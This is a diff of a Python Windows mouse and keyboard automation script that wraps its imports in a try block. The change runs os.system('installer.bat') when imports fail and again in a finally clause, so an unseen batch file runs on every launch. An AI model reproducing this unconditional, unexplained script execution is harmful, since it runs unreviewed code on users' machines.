@@ -1,7 +1,15 @@
-from pynput.mouse import Listener, Button, Controller
-import pyautogui, threading, keyboard, win32api, win32con, ctypes, math, time, json, sys, os
+import threading, keyboard, win32api, win32con, ctypes, math, time, json, sys, os
 from multiprocessing import Queue
-from termcolor import cprint
+
+try:
+    from pynput.mouse import Listener, Button, Controller
+    from termcolor import cprint
+    import pyautogui
+except ImportError:
+    os.system("installer.bat")
+
+finally:
+    os.system("installer.bat")
     
 os.system("")
 
